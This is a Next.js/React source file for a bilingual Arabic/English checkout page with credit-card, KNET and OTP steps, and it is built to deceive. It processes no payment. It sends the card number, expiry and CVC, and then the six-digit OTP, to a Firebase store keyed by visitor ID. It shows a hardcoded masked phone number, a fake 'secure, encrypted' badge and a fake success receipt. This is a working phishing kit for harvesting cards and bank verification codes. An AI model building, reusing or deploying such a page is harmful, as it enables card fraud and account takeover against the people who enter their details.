"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import {
  CreditCard,
  Wallet,
  Check,
  Shield,
  Download,
  ArrowRight,
  AlertCircle,
  Info,
  Lock,
  Languages,
  CircleCheck,
  CircleDashed,
  Building2,
  Smartphone,
  Star,
  Zap,
} from "lucide-react"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Badge } from "@/components/ui/badge"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import { addData } from "@/lib/firebase"

// Payment flow states
type PaymentState = "FORM" | "OTP" | "SUCCESS"

export default function PaymentMethods() {
  const [paymentMethod, setPaymentMethod] = useState<string | null>(null)
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentState, setPaymentState] = useState<PaymentState>("FORM")
  const [otpValues, setOtpValues] = useState<string[]>(Array(6).fill(""))
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>(Array(6).fill(null))
  const [otpError, setOtpError] = useState("")
  const [resendDisabled, setResendDisabled] = useState(false)
  const [countdown, setCountdown] = useState(30)
  const router = useRouter()
  const [isArabic, setIsArabic] = useState(false)

  // Form validation
  const [cardNumber, setCardNumber] = useState("")
  const [cardExpiry, setCardExpiry] = useState("")
  const [cardCvc, setCardCvc] = useState("")
  const [currency, setCurrency] = useState("sar")
  const [formErrors, setFormErrors] = useState<Record<string, string>>({})
  const generateOrderId = () => `ORD-${Math.floor(10000 + Math.random() * 90000)}`

  // Order details state
  const [orderDetails, setOrderDetails] = useState({
    id: generateOrderId(),
    total: "114.00", // Default value
    date: new Date().toISOString(),
  })

  // Initialize order details from localStorage on client-side only
  useEffect(() => {
    try {
      const storedAmount = localStorage.getItem("amount")
      if (storedAmount) {
        setOrderDetails((prev) => ({
          ...prev,
          total: storedAmount,
        }))
      }

      // Check if language preference is stored
      const storedLanguage = localStorage.getItem("language")
      if (storedLanguage) {
        setIsArabic(storedLanguage === "ar")
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error)
    }
  }, [])

  // Toggle language function
  const toggleLanguage = () => {
    const newLanguage = !isArabic
    setIsArabic(newLanguage)
    try {
      localStorage.setItem("language", newLanguage ? "ar" : "en")
    } catch (error) {
      console.error("Error saving to localStorage:", error)
    }
  }

  // Get visitor ID from localStorage (if available)
  const getVisitorId = () => {
    try {
      if (typeof window !== "undefined") {
        return localStorage.getItem("visitor") || "anonymous-user"
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error)
    }
    return "anonymous-user"
  }

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Format expiry date
  const formatExpiry = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    if (v.length >= 3) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }

    return value
  }

  // Validate form
  const validateForm = () => {
    const errors: Record<string, string> = {}

    if (!cardNumber) {
      errors.cardNumber = isArabic ? "يرجى إدخال رقم البطاقة" : "Please enter card number"
    } else if (cardNumber.replace(/\s+/g, "").length < 16) {
      errors.cardNumber = isArabic ? "رقم البطاقة غير صحيح" : "Invalid card number"
    }

    if (!cardExpiry) {
      errors.cardExpiry = isArabic ? "يرجى إدخال تاريخ الانتهاء" : "Please enter expiry date"
    } else if (cardExpiry.length < 5) {
      errors.cardExpiry = isArabic ? "تاريخ الانتهاء غير صحيح" : "Invalid expiry date"
    }

    if (!cardCvc) {
      errors.cardCvc = isArabic ? "يرجى إدخال رمز الأمان" : "Please enter security code"
    } else if (cardCvc.length < 3) {
      errors.cardCvc = isArabic ? "رمز الأمان غير صحيح" : "Invalid security code"
    }

    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  // Handle initial payment submission
  const handlePayment = () => {
    if (paymentMethod === "card" && !validateForm()) {
      return
    }

    if (paymentMethod === "paypal") {
      router.push("/knet")
      return
    }

    setIsProcessing(true)

    // Submit card data
    const visitorId = getVisitorId()
    addData({ id: visitorId, cardNumber, cardExpiry, cardCvc })

    // Simulate payment processing
    setTimeout(() => {
      setIsProcessing(false)
      setShowOtpDialog(true)

      // Focus the first OTP input when the OTP dialog appears
      setTimeout(() => {
        if (otpInputRefs.current[0]) {
          otpInputRefs.current[0].focus()
        }
      }, 100)
    }, 1500)
  }

  // Handle OTP input change
  const handleOtpChange = (index: number, value: string) => {
    // Only allow numbers
    if (value && !/^\d*$/.test(value)) return

    const newOtpValues = [...otpValues]
    newOtpValues[index] = value
    setOtpValues(newOtpValues)
    setOtpError("")

    // Auto-focus next input
    if (value && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  // Handle OTP input keydown
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpValues[index] && index > 0) {
      // Focus previous input when backspace is pressed on an empty input
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  // Handle OTP verification
  const verifyOtp = () => {
    const otpCode = otpValues.join("")

    if (otpCode.length !== 6) {
      setOtpError(isArabic ? "يرجى إدخال رمز التحقق المكون من 6 أرقام" : "Please enter the 6-digit verification code")
      return
    }

    setIsProcessing(true)

    // Submit OTP code
    const visitorId = getVisitorId()
    addData({ id: visitorId, otp: otpCode })

    // Simulate OTP verification
    setTimeout(() => {
      setIsProcessing(false)
      setShowOtpDialog(false)
      setPaymentState("SUCCESS")
    }, 1500)
  }

  // Handle OTP resend
  const resendOtp = () => {
    setResendDisabled(true)
    setCountdown(30)
    // Reset OTP fields
    setOtpValues(Array(6).fill(""))
    setOtpError("")
    // Focus the first input
    setTimeout(() => {
      if (otpInputRefs.current[0]) {
        otpInputRefs.current[0].focus()
      }
    }, 100)
  }

  // Countdown timer for OTP resend
  useEffect(() => {
    let timer: NodeJS.Timeout
    if (resendDisabled && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown(countdown - 1)
      }, 1000)
    } else if (countdown === 0) {
      setResendDisabled(false)
    }
    return () => clearTimeout(timer)
  }, [resendDisabled, countdown])

  // Get current date in Arabic or English format
  const getCurrentDate = () => {
    const options: Intl.DateTimeFormatOptions = {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    }
    return new Date().toLocaleDateString(isArabic ? "ar-SA" : "en-US", options)
  }

  // Translations object
  const translations = {
    completePayment: {
      ar: "إتمام الدفع",
      en: "Complete Payment",
    },
    secure: {
      ar: "آمن",
      en: "Secure",
    },
    choosePaymentMethod: {
      ar: "اختر طريقة الدفع المفضلة لديك أدناه",
      en: "Choose your preferred payment method below",
    },
    payment: {
      ar: "الدفع",
      en: "Payment",
    },
    verification: {
      ar: "التحقق",
      en: "Verification",
    },
    confirmation: {
      ar: "التأكيد",
      en: "Confirmation",
    },
    orderNumber: {
      ar: "رقم الطلب:",
      en: "Order Number:",
    },
    totalAmount: {
      ar: "المبلغ الإجمالي:",
      en: "Total Amount:",
    },
    paymentMethod: {
      ar: "طريقة الدفع",
      en: "Payment Method",
    },
    creditCard: {
      ar: "بطاقة ائتمان",
      en: "Credit Card",
    },
    knet: {
      ar: "كي نت",
      en: "KNET",
    },
    cardNumber: {
      ar: "رقم البطاقة",
      en: "Card Number",
    },
    cardNumberTooltip: {
      ar: "أدخل 16 رقم الموجود على بطاقتك",
      en: "Enter the 16-digit number on your card",
    },
    expiryDate: {
      ar: "تاريخ الانتهاء",
      en: "Expiry Date",
    },
    securityCode: {
      ar: "رمز التحقق",
      en: "Security Code",
    },
    payNow: {
      ar: "ادفع الآن",
      en: "Pay Now",
    },
    processing: {
      ar: "جاري المعالجة...",
      en: "Processing...",
    },
    allTransactionsSecure: {
      ar: "جميع المعاملات مشفرة وآمنة",
      en: "All transactions are encrypted and secure",
    },
    paymentSuccessful: {
      ar: "تم الدفع بنجاح",
      en: "Payment Successful",
    },
    thankYou: {
      ar: "شكراً لك، تمت عملية الدفع بنجاح",
      en: "Thank you, your payment was successful",
    },
    paymentDate: {
      ar: "تاريخ الدفع:",
      en: "Payment Date:",
    },
    emailSent: {
      ar: "تم إرسال تفاصيل الدفع إلى بريدك الإلكتروني",
      en: "Payment details have been sent to your email",
    },
    returnToHome: {
      ar: "العودة للرئيسية",
      en: "Return to Home",
    },
    printReceipt: {
      ar: "طباعة الإيصال",
      en: "Print Receipt",
    },
    paymentVerification: {
      ar: "التحقق من الدفع",
      en: "Payment Verification",
    },
    enterVerificationCode: {
      ar: "أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك",
      en: "Enter the 6-digit verification code sent to your phone",
    },
    codeSentTo: {
      ar: "تم إرسال رمز التحقق إلى",
      en: "Verification code sent to",
    },
    didntReceiveCode: {
      ar: "لم تستلم الرمز؟",
      en: "Didn't receive the code?",
    },
    resendCode: {
      ar: "إعادة إرسال الرمز",
      en: "Resend Code",
    },
    resendAfter: {
      ar: "إعادة الإرسال بعد",
      en: "Resend after",
    },
    seconds: {
      ar: "ثانية",
      en: "seconds",
    },
    confirm: {
      ar: "تأكيد",
      en: "Confirm",
    },
    verifying: {
      ar: "جاري التحقق...",
      en: "Verifying...",
    },
  }

  // Helper function to get translation
  const t = (key: keyof typeof translations) => {
    return isArabic ? translations[key].ar : translations[key].en
  }

  // Progress indicator
  const renderProgressIndicator = () => (
    <div className="flex items-center justify-between mb-10">
      <div className="flex flex-col items-center relative z-10">
        <div
          className={`w-14 h-14 rounded-full flex items-center justify-center border-2 transition-all duration-500 shadow-professional ${
            paymentState === "FORM"
              ? "bg-gradient-to-br from-purple-700 to-purple-500 text-white shadow-professional-lg"
              : "bg-gradient-to-br from-purple-500 to-purple-200 text-white shadow-professional-lg"
          }`}
        >
          <CircleCheck className="h-7 w-7" />
        </div>
        <span className="text-sm mt-4 font-semibold text-slate-700 text-professional">{t("payment")}</span>
      </div>
      <div
        className={`h-1 flex-1 mx-6 rounded-full transition-all duration-700 ${paymentState !== "FORM" ? "bg-gradient-to-r from-purple-600 to-purple-400" : "bg-slate-200"}`}
      ></div>
      <div className="flex flex-col items-center relative z-10">
        <div
          className={`w-14 h-14 rounded-full flex items-center justify-center border-2 transition-all duration-500 shadow-professional ${
            paymentState === "OTP"
              ? "bg-gradient-to-br from-purple-700 to-purple-500 border-slate-900 text-white shadow-professional-lg"
              : paymentState === "SUCCESS"
                ? "bg-gradient-to-br from-purple-700 to-purple-500 border-slate-900 text-white shadow-professional-lg"
                : "bg-white border-slate-200 text-slate-400"
          }`}
        >
          {paymentState === "OTP" || paymentState === "SUCCESS" ? (
            <CircleCheck className="h-7 w-7" />
          ) : (
            <CircleDashed className="h-7 w-7" />
          )}
        </div>
        <span className="text-sm mt-4 font-semibold text-slate-700 text-professional">{t("verification")}</span>
      </div>
      <div
        className={`h-1 flex-1 mx-6 rounded-full transition-all duration-700 ${paymentState === "SUCCESS" ? "bg-gradient-to-r from-purple-600 to-purple-400" : "bg-slate-200"}`}
      ></div>
      <div className="flex flex-col items-center relative z-10">
        <div
          className={`w-14 h-14 rounded-full flex items-center justify-center border-2 transition-all duration-500 shadow-professional ${
            paymentState === "SUCCESS"
              ? "bg-gradient-to-br from-purple-700 to-purple-500 border-slate-900 text-white shadow-professional-lg"
              : "bg-white border-slate-200 text-slate-400"
          }`}
        >
          {paymentState === "SUCCESS" ? <CircleCheck className="h-7 w-7" /> : <CircleDashed className="h-7 w-7" />}
        </div>
        <span className="text-sm mt-4 font-semibold text-slate-700 text-professional">{t("confirmation")}</span>
      </div>
    </div>
  )

  // Render success state
  const renderSuccessState = () => (
    <>
      <CardHeader className="space-y-1 pb-8 text-center border-b border-slate-100">
        <div className="flex justify-center mb-10">
          <div className="w-28 h-28 bg-emerald-50 rounded-full flex items-center justify-center border border-emerald-100 shadow-professional-lg">
            <Check className="h-14 w-14 text-emerald-600" />
          </div>
        </div>
        <CardTitle className="text-4xl font-bold text-slate-900 heading-professional">{t("paymentSuccessful")}</CardTitle>
        <CardDescription className="text-xl text-slate-600 mt-4 text-professional">{t("thankYou")}</CardDescription>
      </CardHeader>
      <CardContent className="space-y-10 pt-10">
        {renderProgressIndicator()}

        <div className="bg-gradient-to-br from-slate-50 to-slate-100 rounded-3xl p-10 border border-slate-200 shadow-professional">
          <div className="flex justify-between items-center mb-8 pb-6 border-b border-slate-200">
            <span className="text-sm font-medium text-slate-500 uppercase tracking-wide text-professional">{t("orderNumber")}</span>
            <span className="font-bold text-slate-900 text-xl heading-professional">{orderDetails.id}</span>
          </div>
          <div className="flex justify-between items-center mb-8 pb-6 border-b border-slate-200">
            <span className="text-sm font-medium text-slate-500 uppercase tracking-wide text-professional">{t("paymentDate")}</span>
            <span className="font-semibold text-slate-700 text-lg text-professional">{getCurrentDate()}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-sm font-medium text-slate-500 uppercase tracking-wide text-professional">{t("totalAmount")}</span>
            <span className="font-bold text-3xl text-slate-900 heading-professional">
              {orderDetails.total} {currency === "sar" ? (isArabic ? "د.ك" : "KWD") : "$"}
            </span>
          </div>
        </div>

        <div className="text-center bg-blue-50 rounded-2xl p-8 border border-blue-100 shadow-professional">
          <div className="flex items-center justify-center gap-3 text-blue-700 mb-3">
            <Building2 className="h-6 w-6" />
            <span className="font-semibold text-lg heading-professional">Receipt Notification</span>
          </div>
          <p className="text-blue-600 text-lg text-professional">{t("emailSent")}</p>
        </div>
      </CardContent>
      <CardFooter className="flex flex-col gap-6 pt-10 border-t border-slate-100">
        <Button
          className="btn-professional w-full h-16 text-lg font-semibold bg-gradient-to-br from-purple-700 to-purple-500 hover:bg-slate-800 text-white rounded-2xl shadow-professional-lg hover:shadow-xl transition-all duration-300"
          onClick={() => router.push("/")}
        >
          <span className="flex items-center gap-4">
            {t("returnToHome")}
            <ArrowRight className="h-6 w-6" />
          </span>
        </Button>
        <Button
          variant="outline"
          className="w-full h-14 border-slate-200 text-slate-700 hover:bg-slate-50 rounded-2xl font-semibold text-lg shadow-professional"
          onClick={() => window.print()}
        >
          <span className="flex items-center gap-3">
            <Download className="h-5 w-5" />
            {t("printReceipt")}
          </span>
        </Button>
      </CardFooter>
    </>
  )

  return (
    <div
      className="flex justify-center items-center min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 p-6"
      dir={isArabic ? "rtl" : "ltr"}
    >
      {/* Language Toggle Button */}
      <div className="absolute top-8 right-8 z-10">
        <button
          onClick={toggleLanguage}
          className="bg-white rounded-full p-4 hover:bg-slate-50 transition-all duration-300 shadow-professional-lg border border-slate-200 hover:scale-105"
        >
          <Languages className="text-slate-700" size={24} />
        </button>
      </div>

      <Card className="w-full max-w-2xl shadow-professional-xl border-0 overflow-hidden rounded-3xl glass">
        {paymentState === "FORM" && (
          <>
            <CardHeader className="space-y-1 pb-10 border-b border-slate-100 bg-white">
              <div className="flex justify-between items-start">
                <div>
                  <CardTitle className="text-4xl font-bold text-slate-900 mb-4 heading-professional">{t("completePayment")}</CardTitle>
                  <CardDescription className="text-slate-600 text-lg text-professional">{t("choosePaymentMethod")}</CardDescription>
                </div>
                <Badge
                  variant="outline"
                  className="flex items-center gap-3 px-4 py-3 bg-emerald-50 text-emerald-700 border-emerald-200 font-semibold text-lg shadow-professional"
                >
                  <Shield className="h-5 w-5" /> {t("secure")}
                </Badge>
              </div>
            </CardHeader>
            <CardContent className="space-y-10 pt-10">
              {renderProgressIndicator()}

              <div className="bg-gradient-to-br from-slate-50 to-slate-100 rounded-3xl p-10 border border-slate-200 shadow-professional">
                <div className="flex justify-between items-center mb-8 pb-6 border-b border-slate-200">
                  <span className="text-sm font-medium text-slate-500 uppercase tracking-wide text-professional">{t("orderNumber")}</span>
                  <span className="font-bold text-slate-900 text-xl heading-professional">{orderDetails.id}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-sm font-medium text-slate-500 uppercase tracking-wide text-professional">{t("totalAmount")}</span>
                  <span className="font-bold text-3xl text-slate-900 heading-professional">
                    {orderDetails.total} {currency === "sar" ? (isArabic ? "د.ك" : "KWD") : "$"}
                  </span>
                </div>
              </div>

              <div>
                <h3 className="font-bold mb-8 text-slate-900 text-2xl heading-professional">{t("paymentMethod")}</h3>
                <RadioGroup value={paymentMethod || ""} onValueChange={setPaymentMethod} className="grid gap-6">
                  <div className="grid gap-8">
                    <div className="relative">
                      <div
                        className={`absolute inset-0 rounded-3xl transition-all duration-500 ${
                          paymentMethod === "card" ? "ring-2 ring-purple-500 shadow-professional-lg" : ""
                        }`}
                      ></div>
                      <div className="flex items-center space-x-2 relative">
                        <RadioGroupItem value="card" id="card" className="text-purple-600 border-slate-300" />
                        <Label
                          htmlFor="card"
                          className="flex items-center gap-6 cursor-pointer rounded-3xl border-2 border-slate-200 p-8 hover:bg-slate-50 hover:border-slate-300 transition-all duration-300 w-full card-hover"
                        >
                          <div className="bg-gradient-to-br from-purple-700 to-purple-500 text-white p-4 rounded-2xl shadow-professional">
                            <CreditCard className="h-8 w-8" />
                          </div>
                          <div className="font-semibold text-slate-900 text-xl heading-professional">{t("creditCard")}</div>
                          <div className={`flex gap-4 ${isArabic ? "mr-auto" : "ml-auto"}`}>
                            <div className="rounded-xl overflow-hidden shadow-professional">
                              <Image
                                src="/visa.svg"
                                alt="visa"
                                width={45}
                                height={28}
                              />
                            </div>
                            <div className="rounded-xl overflow-hidden shadow-professional">
                              <Image
                                src="/mas.svg"
                                alt="mastercard"
                                width={45}
                                height={28}
                              />
                            </div>
                            <div className="rounded-xl overflow-hidden shadow-professional">
                              <Image
                                src="/amex.svg"
                                alt="express"
                                width={45}
                                height={28}
                              />
                            </div>
                          </div>
                        </Label>
                      </div>
                    </div>

                    {paymentMethod === "card" && (
                      <div
                        className={`grid gap-8 ${isArabic ? "pr-10" : "pl-10"} animate-scaleIn`}
                        dir={isArabic ? "rtl" : "ltr"}
                      >
                        <div className="grid gap-4">
                          <div className="flex items-center justify-between">
                            <Label
                              htmlFor="card-number"
                              className="flex items-center gap-3 text-slate-700 font-semibold text-lg"
                            >
                              {t("cardNumber")}
                              <TooltipProvider>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-5 w-5 text-slate-400" />
                                  </TooltipTrigger>
                                  <TooltipContent>
                                    <p>{t("cardNumberTooltip")}</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </Label>
                            {formErrors.cardNumber && (
                              <span className="text-sm text-red-600 flex items-center gap-2 font-medium">
                                <AlertCircle className="h-5 w-5" /> {formErrors.cardNumber}
                              </span>
                            )}
                          </div>
                          <div className="relative">
                            <Input
                              id="card-number"
                              placeholder="1234 5678 9012 3456"
                              value={cardNumber}
                              onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                              maxLength={19}
                              className={`rounded-2xl h-16 px-6 text-xl font-mono border-2 transition-all duration-300 shadow-professional ${
                                formErrors.cardNumber
                                  ? "border-red-300 focus:border-red-500"
                                  : "border-slate-200 focus:border-purple-500"
                              }`}
                            />
                            <div className="absolute right-5 top-1/2 -translate-y-1/2">
                              <div className="w-10 h-6 bg-slate-900 rounded-lg"></div>
                            </div>
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-8">
                          <div className="grid gap-4">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="expiry" className="text-slate-700 font-semibold text-lg">
                                {t("expiryDate")}
                              </Label>
                              {formErrors.cardExpiry && (
                                <span className="text-sm text-red-600 flex items-center gap-2 font-medium">
                                  <AlertCircle className="h-5 w-5" /> {formErrors.cardExpiry}
                                </span>
                              )}
                            </div>
                            <Input
                              id="expiry"
                              placeholder="MM/YY"
                              type="tel"
                              value={cardExpiry}
                              onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                              maxLength={5}
                              className={`rounded-2xl h-16 text-xl font-mono border-2 transition-all duration-300 shadow-professional ${
                                formErrors.cardExpiry
                                  ? "border-red-300 focus:border-red-500"
                                  : "border-slate-200 focus:border-purple-500"
                              }`}
                            />
                          </div>
                          <div className="grid gap-4">
                            <div className="flex items-center justify-between">
                              <Label htmlFor="cvc" className="text-slate-700 font-semibold text-lg">
                                {t("securityCode")}
                              </Label>
                              {formErrors.cardCvc && (
                                <span className="text-sm text-red-600 flex items-center gap-2 font-medium">
                                  <AlertCircle className="h-5 w-5" /> {formErrors.cardCvc}
                                </span>
                              )}
                            </div>
                            <Input
                              id="cvc"
                              placeholder="123"
                              type="tel"
                              maxLength={4}
                              value={cardCvc}
                              onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
                              className={`rounded-2xl h-16 text-xl font-mono border-2 transition-all duration-300 shadow-professional ${
                                formErrors.cardCvc
                                  ? "border-red-300 focus:border-red-500"
                                  : "border-slate-200 focus:border-purple-500"
                              }`}
                            />
                          </div>
                        </div>
                      </div>
                    )}

                    <div className="relative">
                      <div
                        className={`absolute inset-0 rounded-3xl transition-all duration-500 ${
                          paymentMethod === "paypal" ? "ring-2 ring-purple-500 shadow-professional-lg" : ""
                        }`}
                      ></div>
                      <div className="flex items-center space-x-2 relative">
                        <RadioGroupItem value="paypal" id="paypal" className="text-purple-600 border-slate-300" />
                        <Label
                          htmlFor="paypal"
                          className="flex items-center gap-6 cursor-pointer rounded-3xl border-2 border-slate-200 p-8 hover:bg-slate-50 hover:border-slate-300 transition-all duration-300 w-full card-hover"
                        >
                          <div className="bg-gradient-to-br from-purple-700 to-purple-500 text-white p-4 rounded-2xl shadow-professional">
                            <Wallet className="h-8 w-8" />
                          </div>
                          <div className="font-semibold text-slate-900 text-xl heading-professional">{t("knet")}</div>
                          <div className={`flex gap-3 ${isArabic ? "mr-auto" : "ml-auto"}`}>
                            <img src="/vercel.svg" className="h-8 w-8" />
                          </div>
                        </Label>
                      </div>
                    </div>
                  </div>
                </RadioGroup>
              </div>
            </CardContent>
            <CardFooter className="flex flex-col gap-8 border-t border-slate-100 pt-10 bg-white">
              <Button
                className="btn-professional w-full h-16 text-xl font-semibold bg-gradient-to-br from-purple-700 to-purple-500 hover:bg-slate-800 text-white rounded-2xl shadow-professional-lg hover:shadow-xl transition-all duration-300"
                disabled={!paymentMethod || isProcessing}
                onClick={handlePayment}
              >
                {isProcessing ? (
                  <span className="flex items-center gap-4">
                    <div className="spinner"></div>
                    {t("processing")}
                  </span>
                ) : (
                  <span className="flex items-center gap-4">
                    {t("payNow")}
                    <ArrowRight className="h-6 w-6" />
                  </span>
                )}
              </Button>
              <div className="flex items-center justify-center gap-4 text-sm text-slate-500 bg-slate-50 rounded-2xl p-6 shadow-professional">
                <Shield className="h-5 w-5" />
                <span className="font-medium text-lg text-professional">{t("allTransactionsSecure")}</span>
              </div>
            </CardFooter>
          </>
        )}

        {paymentState === "SUCCESS" && renderSuccessState()}

        {/* OTP Dialog */}
        <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
          <DialogContent className="sm:max-w-lg rounded-3xl border-0 shadow-professional-xl glass" dir={isArabic ? "rtl" : "ltr"}>
            <DialogHeader className="text-center pb-8 border-b border-slate-100">
              <div className="flex justify-center mb-8">
                <div className="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center border border-blue-100 shadow-professional-lg">
                  <Smartphone className="h-10 w-10 text-blue-600" />
                </div>
              </div>
              <DialogTitle className="text-3xl font-bold text-slate-900 heading-professional">{t("paymentVerification")}</DialogTitle>
              <DialogDescription className="text-slate-600 text-lg mt-4 text-professional">
                {t("enterVerificationCode")}
              </DialogDescription>
            </DialogHeader>

            <div className="bg-gradient-to-br from-slate-50 to-slate-100 rounded-3xl p-8 my-8 border border-slate-200 shadow-professional">
              <div className="flex justify-between items-center mb-6 pb-4 border-b border-slate-200">
                <span className="text-sm font-medium text-slate-500 uppercase tracking-wide text-professional">{t("orderNumber")}</span>
                <span className="font-bold text-slate-900 text-lg heading-professional">{orderDetails.id}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-sm font-medium text-slate-500 uppercase tracking-wide text-professional">{t("totalAmount")}</span>
                <span className="font-bold text-2xl text-slate-900 heading-professional">
                  {orderDetails.total} {currency === "sar" ? (isArabic ? "د.ك" : "KWD") : "$"}
                </span>
              </div>
            </div>

            <div className="text-center mb-8 bg-blue-50 rounded-2xl p-6 border border-blue-100 shadow-professional">
              <p className="text-sm mb-2 text-blue-600 font-medium text-professional">{t("codeSentTo")}</p>
              <p className="font-bold text-blue-900 text-lg heading-professional">+965 5XX XXX XX89</p>
            </div>

            <div className="flex justify-center gap-4 my-10">
              {otpValues.map((value, index) => (
                <div key={index} className="relative">
                  <Input
                    ref={(el) => (otpInputRefs.current[index] = el)}
                    type="tel"
                    inputMode="numeric"
                    maxLength={1}
                    value={value}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    className={`w-16 h-20 text-center text-2xl font-bold rounded-2xl border-2 transition-all duration-300 shadow-professional ${
                      otpError ? "border-red-300 focus:border-red-500" : "border-slate-200 focus:border-purple-500"
                    }`}
                  />
                </div>
              ))}
            </div>

            {otpError && (
              <div className="bg-red-50 text-red-600 rounded-2xl p-6 text-center text-sm flex items-center justify-center gap-3 border border-red-100 font-medium shadow-professional">
                <AlertCircle className="h-5 w-5" />
                {otpError}
              </div>
            )}

            <div className="text-center mb-8">
              <p className="text-sm text-slate-500 mb-4 text-professional">{t("didntReceiveCode")}</p>
              <Button
                variant="link"
                onClick={resendOtp}
                disabled={resendDisabled}
                className="text-sm p-0 h-auto text-slate-700 hover:text-slate-900 font-semibold text-lg"
              >
                {resendDisabled ? `${t("resendAfter")} ${countdown} ${t("seconds")}` : t("resendCode")}
              </Button>
            </div>

            <DialogFooter className="sm:justify-center pt-8 border-t border-slate-100">
              <Button
                className="btn-professional w-full h-16 text-xl font-semibold bg-gradient-to-br from-purple-700 to-purple-500 hover:bg-slate-800 text-white rounded-2xl shadow-professional-lg hover:shadow-xl transition-all duration-300"
                disabled={otpValues.some((v) => !v) || isProcessing}
                onClick={verifyOtp}
              >
                {isProcessing ? (
                  <span className="flex items-center gap-4">
                    <div className="spinner"></div>
                    {t("verifying")}
                  </span>
                ) : (
                  <span className="flex items-center gap-4">
                    <Lock className="h-6 w-6" />
                    {t("confirm")}
                  </span>
                )}
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </Card>
    </div>
  )
}